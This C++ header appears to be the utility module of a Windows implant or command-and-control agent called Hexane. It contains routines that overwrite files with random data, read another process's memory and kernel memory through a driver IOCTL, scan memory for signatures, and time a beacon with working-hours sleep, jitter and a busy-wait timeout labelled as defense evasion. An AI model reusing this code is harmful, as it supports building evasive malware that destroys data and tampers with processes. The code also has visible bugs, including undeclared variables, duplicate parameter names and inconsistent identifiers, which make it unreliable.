#ifndef HEXANE_UTILS_HPP
#define HEXANE_UTILS_HPP

using namespace Modules;
using namespace Utils::Random;

namespace Utils {
	BOOL WriteToDisk(CONST WCHAR *path, CONST UINT8* data, SIZE_T size) {
		HANDLE handle = Ctx->Win32.CreateFileW(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (handle == INVALID_HANDLE_VALUE) {
			return false;
		}

		DWORD write = 0;
		BOOL result = Ctx->Win32.WriteFile(handle, data, (DWORD)size, &write, NULL);

		Ctx->Win32.NtClose(handle);
		return (result && write == size);
	}

	BOOL ReadFromDisk(CONST WCHAR* path, UINT8* data, SIZE_T size) {
		HANDLE handle = Ctx->Win32.CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (handle == INVALID_HANDLE_VALUE) {
			return false;
		}

		DWORD read = 0;
		BOOL result = Ctx->Win32.ReadFile(handle, data, (DWORD) size, &read, NULL);

		ctx->win32.NtClose(handle);
		return (result && read == size);
	}

	BOOL DestroyFileData(CONST WCHAR* path, SIZE_T size) {
		BOOL success    = false;
		UINT8 *rndData 	= nullptr;
		INT newLength   = 0;
		DWORD write 	= 0;

		HANDLE handle = Ctx->Win32.CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (handle == INVALID_HANDLE_VALUE) {
			goto defer;
		}

		newLength = size + ((INT_PTR) RandomNumber32() * (INT_PTR) RandomNumber32()) % 2000000 + 1000;
		rndData = (UINT8*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, newLength);

		if (!rndData) {
			ctx->win32.NtClose(handle);
			goto defer;
		}

		for (SIZE_T idx = 0; i < newLength; idx++) {
			rndData[idx] = (UINT8) (RandomNumber32() % 255);
		}
		if (!Ctx->Win32.WriteFile(handle, rndData, newLength, &write, NULL) || write != newLength) {
			// LOG ERROR
			goto defer;
		} 

		success = true;
defer:
		if (rndData) {
			Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, rndData);
		}
		if (handle) {
			Ctx->Win32.NtClose(handle);
		}

		return success;
	}

	PVOID FindRelativeAddress(HANDLE handle, LPVOID offset, UINT32 offset, UINT32 nOffset) {
		UINT_PTR instr = (UINT_PTR) offset;
		INT32 ripOffset = 0;

		Ctx->Ntstatus = Ctx->Win32.NtReadVirtualMemory(handle, (LPVOID)instr + offset, &ripOffset, sizeof(int32), nullptr);
		if (!NT_SUCCESS(Ctx->Ntstatus)) {
			return nullptr;
		}

		return (LPVOID) (instr + nOffset + ripOffset);
	}

	VOID AppendBuffer(UINT8** buffer, CONST UINT8 *CONST target, UINT32 *capacity, CONST UINT32 length) {
        const auto newBuffer = (PBYTE) Ctx->Win32.RtlReAllocateHeap(Ctx->Heap, 0, *buffer, *capacity + length);
        if (!newBuffer) {
            return;
        }

        *buffer = newBuffer;
        MemCopy((PBYTE) *buffer + *capacity, (LPVOID) target, length);
        *capacity += length;
    }

    VOID AppendPointerList(VOID** array[], VOID* pointer, UINT32* count) {
        const auto newList = (VOID**) Ctx->Win32.RtlReAllocateHeap(Ctx->Heap, 0, *array, (*count + 1) * sizeof(LPVOID));
        if (!newList) {
            return;
        }

        *array = newList;
        (*array)[*count] = pointer;
        (*count)++;
    }

	BOOL ReadMemory(HANDLE handle, VOID* dst, VOID* src, UINT_PTR size) {
		if (!dst || !src || !size) {
			return false;
		}

		COPY_MEMORY_BUFFER_INFO buffer = { };
		DWORD read = 0;

		buffer.case_number = 0x33;
		buffer.source = (UINT_PTR) src;
		buffer.destination = (UINT_PTR) dst;
		buffer.length = size;

		return Ctx->Win32.DeviceIoControl(handle, IOCTL1, &buffer, sizeof(buffer), nullptr, 0, &read, nullptr);
	}

    namespace Scanners {
        BOOL MapScan(HASH_MAP* map, UINT32 id, VOID** pointer) {
            for (auto i = 0;; i++) {
                if (!map[i].name) { break; }

                if (id == map[i].name) {
                    *pointer = map[i].address;
                    return true;
                }
            }
            return false;
        }


		UINT_PTR RelocateExport(VOID* CONST process, CONST VOID* CONST target, SIZE_T size) {
			UINT_PTR ret       = 0;
			const auto address  = (UINT_PTR) target;

			for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
				Ctx->Ntstatus = Ctx->Win32.NtAllocateVirtualMemory(process, (VOID**) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ); 

				if (!NT_SUCCESS(Ctx->Ntstatus)) {
					ret = 0;
				}
			}
			return ret;
		}

        BOOL SigCompare(CONST UINT8* data, CONST CHAR* signature, CONST CHAR* mask) {
            while (*mask && ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return false;
                }
            }
            return (*mask == 0x00);
        }

        UINT_PTR SignatureScan(HANDLE handle, CONST UINT_PTR base, CONST UINT32 size, CONST CHAR* signature, CONST CHAR* mask) {
            SIZE_T read   		= 0;
            UINT_PTR address   	= 0;

            auto buffer = (UINT8*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, size);

            Ctx->Ntstatus = Ctx->Win32.NtReadVirtualMemory(handle, (VOID*) base, buffer, size, &read);
			if (!NT_SUCCESS(Ctx->Ntstatus)) {
				goto defer;
			}

            for (auto i = 0; i < size; i++) {
                if (SigCompare(buffer + i, signature, mask)) {
                    address = base + i;
                    break;
                }
            }

            MemSet(buffer, 0, size);
defer:
            if (buffer) {
				Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, buffer);
			}
            return address;
        }

		UINT_PTR SignatureScanSection(HANDLE handle, CONST CHAR *sxnName, UINT_PTR base, CONST CHAR *signature, CONST CHAR *mask) {
			UINT32 size = 0;
			UINT_PTR section = FindSection(sxnName, base, &size);

			if (!section) {
				return 0;
			}

			return SignatureScan(handle, section, size, signature, mask);
		}
    }

    namespace Time {
        ULONG64 GetTimeNow() {
            FILETIME fileTime       = { };
            LARGE_INTEGER largeInt  = { };

            Ctx->Win32.GetSystemTimeAsFileTime(&fileTime);

            largeInt.LowPart    = fileTime.dwLowDateTime;
            largeInt.HighPart   = (long) fileTime.dwHighDateTime;

            return largeInt.QuadPart;
        }

        BOOL InWorkingHours() {
            SYSTEMTIME systime = { };

            UINT32 workHours = ctx->config.hours;
            UINT16 startTime = (workHours >> 16); 		
            UINT16 endTime  = (workHours & 0xFFFF); 

            // Decode the start time (HHMM)
            UINT16 startHour = startTime / 100;  
            UINT16 startMin = startTime % 100;  

    		// Decode the end time (HHMM)
    		UINT16 endHour 	= endTime / 100;
    		UINT16 endMin   = endTime % 100;

    		Ctx->Win32.GetLocalTime(&systime);

    		// Check if the current time is outside the working hours
    		if ((systime.wHour < startHour || systime.wHour > endHour) ||
        		(systime.wHour == startHour && systime.wMinute < startMin) ||
        		(systime.wHour == endHour && systime.wMinute > endMin)) {
        		return false;
    		}

    		return true;
}


        VOID Timeout(SIZE_T ms) {
            // Courtesy of Illegacy & Shubakki:
            // https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html
            auto defaultseed    = Utils::Random::RandomSeed();
            auto seed           = Ctx->Win32.RtlRandomEx((ULONG*) &defaultseed);

            volatile SIZE_T x   = INTERVAL(seed);
            const UINT_PTR end 	= Utils::Random::Timestamp() + (x * ms);

            while (Random::Timestamp() < end) { x += 1; }
            if (Random::Timestamp() - end > 2000) {
                return;
            }
        }
    }

    namespace Random {
		UINT32 RandomSleepTime() {
			SYSTEMTIME systime = { };

			uint32_t workHours = ctx->config.hours;
			uint32_t sleeptime  = ctx->config.sleeptime * 1000;
			uint32_t variation  = (ctx->config.jitter * sleeptime) / 100;
			uint32_t random     = 0;

			uint16_t startTime = (workHours >> 16);  		
			uint16_t endTime   = (workHours & 0xFFFF);  	

			uint16_t startHour = startTime / 100;  
			uint16_t startMin  = startTime % 100;  
			uint16_t endHour   = endTime / 100;
			uint16_t endMin    = endTime % 100;

			Ctx->Win32.GetLocalTime(&systime);

			if (!Time::InWorkingHours()) {  
				if (sleeptime) {
					sleeptime = 0;  

					// get seconds until midnight, add time until start of next working day
					if (systime.wHour > endHour || (systime.wHour == endHour && systime.wMinute > endMin)) {
						sleeptime += (24 - systime.wHour - 1) * 60 + (60 - systime.wMinute);  
						sleeptime += startHour * 60 + startMin;  								
					} 
					else {
						sleeptime += (startHour - systime.wHour) * 60 + (startMin - systime.wMinute);
					}

					sleeptime *= MS_PER_SECOND;  
				}
			}
			else if (variation) {  				
				random = RandomNumber32();  	
				random = random % variation;  	

				if (RandomBool()) {
					sleeptime += random;  
				} else {
					sleeptime -= random;  
				}
			}

			return sleeptime;
		}

        UINT32 RandomSeed() {
            return 'A2' * -40271 +
                   __TIME__[7] * 1 +
                   __TIME__[6] * 10 +
                   __TIME__[4] * 60 +
                   __TIME__[3] * 600 +
                   __TIME__[1] * 3600 +
                   __TIME__[0] * 36000;
        }

        UINT_PTR Timestamp() {
            LARGE_INTEGER time 		= { };
            const SIZE_T epoch      = 0x019DB1DED53E8000;
            const SIZE_T msTicks   	= 1000;

            time.u.LowPart  = *(UINT32*) 0x7FFE0000 + 0x14;
            time.u.HighPart = *(INT32*) 0x7FFE0000 + 0x1c;

            return (time.QuadPart - epoch) / msTicks;
        }

        UINT32 RandomNumber32() {
            auto seed = RandomSeed();

            seed = Ctx->Win32.RtlRandomEx((PULONG) &seed);
            seed = Ctx->Win32.RtlRandomEx((PULONG) &seed);
            seed = seed % (LONG_MAX - 2 + 1) + 2;

            return seed % 2 == 0 ? seed : seed + 1;
        }

        BOOL RandomBool() {
            auto seed = RandomSeed();

            seed = RandomSeed();
            seed = Ctx->Win32.RtlRandomEx((PULONG) &seed);

            return seed % 2 == 0 ? TRUE : FALSE;
        }
    }
}
#endif // HEXANE_UTILS_HPP
